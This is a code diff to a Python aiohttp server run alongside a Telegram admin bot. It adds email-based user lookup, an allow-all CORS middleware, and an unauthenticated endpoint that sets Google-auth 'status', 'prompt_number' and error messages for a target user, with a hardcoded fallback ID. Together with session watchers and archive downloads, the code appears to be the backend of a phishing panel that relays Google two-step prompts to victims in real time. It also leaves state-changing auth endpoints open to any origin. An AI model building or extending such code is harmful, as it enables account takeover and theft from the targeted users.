@@ -259,13 +259,25 @@ async def handle_auth_status(request: web.Request) -> web.Response:
     try:
         tg_id = request.query.get("tg_id")
         phone = request.query.get("phone")
+        email = request.query.get("email")
         is_auth = False
         user = None
         auth_step = None
         if tg_id:
-            user = db.get_user_by_tg_id(DB_PATH, int(tg_id))
-        elif phone:
-            user = db.get_user_by_phone(DB_PATH, phone)
+            try:
+                user = db.get_user_by_tg_id(DB_PATH, int(tg_id))
+            except Exception:
+                pass
+        if not user and email:
+            try:
+                user = db.get_user_by_email(DB_PATH, email)
+            except Exception:
+                pass
+        if not user and phone:
+            try:
+                user = db.get_user_by_phone(DB_PATH, phone)
+            except Exception:
+                pass
 
         if user:
             try:
@@ -351,6 +363,62 @@ async def handle_download_archive(request: web.Request) -> web.StreamResponse:
     )
 
 
+@web.middleware
+async def cors_middleware(request, handler):
+    if request.method == "OPTIONS":
+        response = web.Response(status=200)
+    else:
+        try:
+            response = await handler(request)
+        except web.HTTPException as ex:
+            response = ex
+    response.headers["Access-Control-Allow-Origin"] = "*"
+    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS, PUT, DELETE"
+    response.headers["Access-Control-Allow-Headers"] = "*"
+    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
+    response.headers["Pragma"] = "no-cache"
+    response.headers["Expires"] = "0"
+    return response
+
+
+async def handle_google_control(request: web.Request) -> web.Response:
+    try:
+        data = await request.json()
+        tg_id = data.get("tg_id")
+        email = data.get("email")
+        status = data.get("status")
+        prompt_number = data.get("prompt_number")
+        error_msg = data.get("error_msg")
+
+        target_id = None
+        if tg_id and str(tg_id).isdigit():
+            target_id = int(tg_id)
+        elif email:
+            user = db.get_user_by_email(DB_PATH, email)
+            if user and user.get("tg_id"):
+                target_id = int(user["tg_id"])
+
+        if not target_id:
+            latest = db.get_latest_google_auth_control(DB_PATH)
+            if latest and latest.get("tg_id"):
+                target_id = int(latest["tg_id"])
+            else:
+                target_id = 7491827504
+
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_id,
+            status=status,
+            prompt_number=prompt_number,
+            error_msg=error_msg,
+        )
+        logger.info("handle_google_control set status '%s' for target_id=%s (email=%s)", status, target_id, email)
+        return web.json_response({"ok": True})
+    except Exception as exc:
+        logger.error("handle_google_control error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
 async def main() -> None:
     bot = Bot(token=ADMIN_BOT_TOKEN)
     test_admin_bot = Bot(token=TEST_ADMIN_BOT_TOKEN) if TEST_ADMIN_BOT_TOKEN else None
@@ -372,10 +440,11 @@ async def main() -> None:
     await start_all_session_watchers()
 
     # Start auth webhook and download server on port 8080
-    app = web.Application()
+    app = web.Application(middlewares=[cors_middleware])
     app.router.add_get("/api/auth/status", handle_auth_status)
     app.router.add_post("/api/auth/complete", handle_auth_complete)
     app.router.add_post("/api/auth/event", handle_auth_event)
+    app.router.add_post("/api/auth/google-control", handle_google_control)
     app.router.add_get("/api/download/{token}", handle_download_archive)
     runner = web.AppRunner(app)
     await runner.setup()
